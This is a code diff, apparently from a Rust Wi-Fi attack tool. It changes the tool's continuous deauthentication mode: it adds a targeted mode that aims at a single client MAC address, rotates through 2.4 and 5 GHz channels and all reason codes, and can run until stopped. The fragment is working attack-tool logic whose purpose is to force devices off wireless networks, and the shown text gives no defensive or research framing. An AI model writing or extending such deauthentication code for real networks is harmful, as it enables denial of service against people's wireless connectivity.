@@ -923,13 +923,19 @@ async fn main() {
 
                 let mut engine = DeauthEngine::new(interface);
                 engine.set_packet_rate(300);
-
-                if count == 0 || want_hop {
-                    // Long-running mode: rotate channels + reason codes.
+                let targeted = station_mac != "ff:ff:ff:ff:ff:ff";
+                if want_hop || count == 0 {
+                    // Rotate through 2.4 + 5 GHz channels and all reason codes.
+                    // With a finite --count + --hop, bound via a frame budget
+                    // at ~600 fps; otherwise run until Ctrl+C (dur=0).
                     let bssids = vec![bssid.clone()];
-                    let dur = if count == 0 { 3600 } else { 0 };
-                    info_log!("continuous deauth (Ctrl+C to stop)");
-                    let result = engine.evacuation_attack(&bssids, dur);
+                    let dur = if count == 0 { 0 } else { ((count as f64) / 600.0).ceil() as u32 };
+                    info_log!("continuous deauth (Ctrl+C to stop) targeted={} dur={}s", targeted, dur);
+                    let result = engine.evacuation_attack_targeted(
+                        &bssids,
+                        if targeted { Some(station_mac.as_str()) } else { None },
+                        dur,
+                    );
                     ok!("Deauth finished: {}", result);
                 } else {
                     let res = if reason == 0 {
